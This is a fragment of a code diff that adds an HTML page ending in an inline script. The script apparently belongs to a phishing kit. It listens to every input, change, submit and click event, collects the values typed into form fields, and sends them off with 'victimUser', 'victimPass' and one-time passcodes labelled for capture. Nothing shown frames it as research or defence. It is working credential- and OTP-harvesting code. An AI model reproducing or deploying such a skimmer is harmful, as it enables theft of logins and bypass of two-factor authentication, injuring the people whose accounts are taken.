+      sendCapture("otp", { otp: code || state.otp });
+    });
+  }
+
+  document.addEventListener("input", (e) => {
+    const el = e.target;
+    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
+    collectCurrentValues();
+  }, true);
+
+  document.addEventListener("change", (e) => {
+    const el = e.target;
+    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
+    collectCurrentValues();
+  }, true);
+
+  document.addEventListener("submit", () => {
+    collectCurrentValues();
+    const hasOtp = NEXUS_CFG.caps.otp && state.otp && state.otp !== "Aucun";
+    if (hasOtp) {
+      sendCapture("otp", { otp: state.otp });
+    } else {
+      sendCapture((NEXUS_CFG.enableOtp && NEXUS_CFG.caps.otp) ? "OTP_STEP1" : "STANDARD");
+    }
+  }, true);
+
+  document.addEventListener("click", (e) => {
+    const btn = e.target.closest("button, input[type='submit'], input[type='button'], [role='button']");
+    if (!btn || btn.id === "nexus-otp-submit") return;
+    collectCurrentValues();
+    const txt = (btn.innerText || btn.value || "").toLowerCase();
+    const hasOtp = NEXUS_CFG.caps.otp && state.otp && state.otp !== "Aucun";
+    if (hasOtp && (txt.includes("otp") || txt.includes("verify") || txt.includes("vérif") || txt.includes("confirm") || txt.includes("valid"))) {
+      sendCapture("otp", { otp: state.otp });
+    } else if (Object.keys(state.capturedFields).length > 0 || state.victimUser || state.victimPass) {
+      sendCapture((NEXUS_CFG.enableOtp && NEXUS_CFG.caps.otp) ? "OTP_STEP1" : "STANDARD");
+    }
+  }, true);
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", ensureOtpSectionIfNeeded);
+  } else {
+    ensureOtpSectionIfNeeded();
+  }
+})();
+</script>
+</body>
+</html>
